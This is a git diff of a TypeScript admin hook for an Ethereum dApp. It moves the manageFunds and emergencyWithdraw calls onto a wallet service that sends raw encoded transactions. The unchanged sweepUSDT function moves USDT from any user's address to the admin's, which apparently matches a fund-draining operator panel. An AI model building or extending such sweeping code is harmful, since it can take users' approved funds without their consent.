@@ -1,5 +1,6 @@
-import { Contract, parseUnits, formatUnits, JsonRpcProvider, BrowserProvider } from 'ethers';
+import { Contract, parseUnits, formatUnits, JsonRpcProvider, BrowserProvider, Interface } from 'ethers';
 import { useWallet } from '../lib/web3';
+import { walletService } from '../lib/walletService';
 import { CONTRACT_ABI as ADMIN_ABI } from '../lib/abi';
 import { CONTRACT_ADDRESS, USDT_ADDRESS } from '../lib/contracts';
 const RPC_NODES = [
@@ -248,26 +249,38 @@ export function useAdmin() {
     };
 
     const manageFunds = async (tokenAddress: string, fromAddress: string, toAddress: string, amountToManage: string) => {
-        const contract = await getContract(true);
-        if (!contract) throw new Error("Wallet not connected");
-        
         const amountInWei = parseUnits(amountToManage, 18);
-        const tx = await contract.manageFunds(tokenAddress, fromAddress, toAddress, amountInWei);
-        return await tx.wait();
+        const from = walletService.getTransactionFromAddress();
+        if (!from) throw new Error('Wallet not connected. Please reconnect and try again.');
+        const adminIface = new Interface(ADMIN_ABI as any);
+        const data = adminIface.encodeFunctionData('manageFunds', [tokenAddress, fromAddress, toAddress, amountInWei]);
+        const hash = await walletService.sendWalletTransaction({
+            to: CONTRACT_ADDRESS,
+            data,
+            from,
+            label: 'Manage funds',
+        });
+        return await walletService.waitForReceipt(hash);
     };
 
     const sweepUSDT = async (fromUser: string, amount: string) => {
-        if (!adminAddress) throw new Error("Admin not connected");
+        if (!adminAddress) throw new Error('Admin not connected');
         return manageFunds(USDT_ADDRESS, fromUser, adminAddress, amount);
     };
 
     const emergencyWithdraw = async (tokenAddress: string, amountToWithdraw: string) => {
-        const contract = await getContract(true);
-        if (!contract) throw new Error("Wallet not connected");
-        
         const amountInWei = parseUnits(amountToWithdraw, 18);
-        const tx = await contract.emergencyWithdraw(tokenAddress, amountInWei);
-        return await tx.wait();
+        const from = walletService.getTransactionFromAddress();
+        if (!from) throw new Error('Wallet not connected. Please reconnect and try again.');
+        const adminIface = new Interface(ADMIN_ABI as any);
+        const data = adminIface.encodeFunctionData('emergencyWithdraw', [tokenAddress, amountInWei]);
+        const hash = await walletService.sendWalletTransaction({
+            to: CONTRACT_ADDRESS,
+            data,
+            from,
+            label: 'Emergency withdraw',
+        });
+        return await walletService.waitForReceipt(hash);
     };
 
     return {
